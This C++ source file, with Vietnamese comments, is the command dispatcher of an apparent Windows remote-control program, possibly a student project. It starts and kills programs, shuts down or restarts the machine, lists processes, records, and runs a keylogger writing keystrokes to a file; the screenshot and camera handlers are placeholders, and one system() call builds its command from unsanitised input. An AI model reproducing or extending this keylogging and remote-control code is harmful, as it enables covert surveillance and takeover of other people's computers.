#include "executeCommand.h"

// Loại bỏ g_current_sender vì server không gửi email nữa

int parse_keylogger_duration(const string& command) {
  size_t pos = command.find("keylogger");
  if (pos == string::npos) return 30;  // default 30 seconds

  string remaining = command.substr(pos + 9);  // skip "keylogger"

  // Tìm số trong chuỗi
  regex numberRegex(R"(\d+)");
  smatch match;
  if (regex_search(remaining, match, numberRegex)) {
    return stoi(match.str());
  }

  return 30;  // default
}

static string trim_command_internal(string command) {
  command.erase(command.begin(), find_if(command.begin(), command.end(),
                                         [](int ch) { return !isspace(ch); }));
  command.erase(find_if(command.rbegin(), command.rend(),
                        [](int ch) { return !isspace(ch); })
                    .base(),
                command.end());
  return command;
}

void handle_start_program(const string& command) {
  string prog = command.substr(13);  // After "start_program"
  prog.erase(prog.begin(), find_if(prog.begin(), prog.end(),
                                   [](int ch) { return !isspace(ch); }));

  if (!prog.empty()) {
    cout << "Starting program: " << prog << endl;
    HINSTANCE result =
        ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
    if (reinterpret_cast<INT_PTR>(result) <= 32) {
      cerr << "Failed to start program. Error code: "
           << reinterpret_cast<INT_PTR>(result) << endl;
    } else {
      cout << "Program started successfully: " << prog << endl;
    }
  } else {
    cout << "No program specified for start_program command" << endl;
  }
}

void handle_shutdown_program(const string& command) {
  string proc = command.substr(16);
  proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
                                   [](int ch) { return !isspace(ch); }));

  if (!proc.empty()) {
    shutdown_program(proc);
    cout << "Shutdown program command executed for: " << proc << endl;
  } else {
    cout << "No process specified for shutdown_program command" << endl;
  }
}

void handle_get_picture(const string& outFile) { take_picture(outFile); }

void handle_get_screenshot(const string& outFile) { take_screenshot(outFile); }

void handle_list_programs(const string& outFile) {
  list_programs_to_file(outFile);  // Running programs
}

void handle_list_processes(const string& outFile) {
  list_processes_to_file(outFile);  // Processes with PID
}

void handle_list_installed(const string& outFile) {
  list_installed_programs_to_file(outFile);  // Installed programs
}

void handle_start_recording(const string& outFile, int duration) {
  run_recording_and_save(outFile, duration);
}

void handle_keylogger(const string& command, const string& outFile) {
  istringstream iss(command);
  string cmd;
  int duration = 10;
  iss >> cmd >> duration;

  cout << "Starting keylogger for " << duration << " seconds..." << endl;
  start_keylogger(outFile, duration);
}

void handle_shutdown() {
  cout << "Initiating system shutdown..." << endl;
  if (system("shutdown /s /t 0") != 0) {
    cerr << "Shutdown command failed" << endl;
  } else {
    cout << "Shutdown initiated successfully" << endl;
  }
}

void execute_command(const string& command) {
  cout << "[Execute] Processing command: " << command << endl;

  if (command.find("start_program") == 0) {
    string program = command.substr(13);  // skip "start_program"
    program.erase(0, program.find_first_not_of(" "));

    if (!program.empty()) {
      cout << "[Execute] Starting program: " << program << endl;
      system(("start \"\" \"" + program + "\"").c_str());
    }
  } else if (command == "shutdown") {
    cout << "[Execute] Shutting down system..." << endl;
    system("shutdown /s /t 5 /c \"Remote shutdown initiated\"");
  } else if (command == "restart") {
    cout << "[Execute] Restarting system..." << endl;
    system("shutdown /r /t 5 /c \"Remote restart initiated\"");
  } else if (command == "cancel_shutdown") {
    cout << "[Execute] Cancelling shutdown/restart..." << endl;
    system("shutdown /a");
  } else if (command.find("keylogger") == 0) {
    int duration = parse_keylogger_duration(command);
    cout << "[Execute] Starting keylogger for " << duration << " seconds..."
         << endl;
    start_keylogger("C:/MMT/keylog.txt", duration);
  } else {
    cout << "[Execute] Unknown command: " << command << endl;
  }
}

void execute_command_with_file(const string& command,
                               const string& outputFile) {
  cout << "[Execute] Processing command with file output: " << command << endl;

  if (command == "get_screenshot") {
    // Placeholder for screenshot - create empty file with message
    ofstream screenshotFile(outputFile);
    if (screenshotFile.is_open()) {
      screenshotFile << "Screenshot feature not implemented yet." << endl;
      screenshotFile.close();
    }
  } else if (command == "get_picture") {
    // Placeholder for camera picture - create empty file with message
    ofstream pictureFile(outputFile);
    if (pictureFile.is_open()) {
      pictureFile << "Camera picture feature not implemented yet." << endl;
      pictureFile.close();
    }
  } else if (command == "list_program") {
    list_programs_to_file(outputFile);
  } else if (command == "list_process") {
    list_processes_to_file(outputFile);
  } else if (command == "list_installed") {
    list_installed_programs_to_file(outputFile);
  } else if (command == "get_recording") {
    int duration = 10;  // default 10 seconds
    // Parse duration from command if provided
    regex numberRegex(R"(\d+)");
    smatch match;
    if (regex_search(command, match, numberRegex)) {
      duration = stoi(match.str());
    }
    run_recording_and_save(outputFile, duration);
  } else if (command.find("keylogger") == 0) {
    int duration = parse_keylogger_duration(command);
    cout << "[Execute] Starting keylogger with file output for " << duration
         << " seconds..." << endl;
    start_keylogger(outputFile, duration);
  } else {
    cout << "[Execute] Unknown command with file: " << command << endl;
    // Tạo file error
    ofstream errorFile(outputFile);
    if (errorFile.is_open()) {
      errorFile << "Error: Unknown command - " << command << endl;
      errorFile.close();
    }
  }
}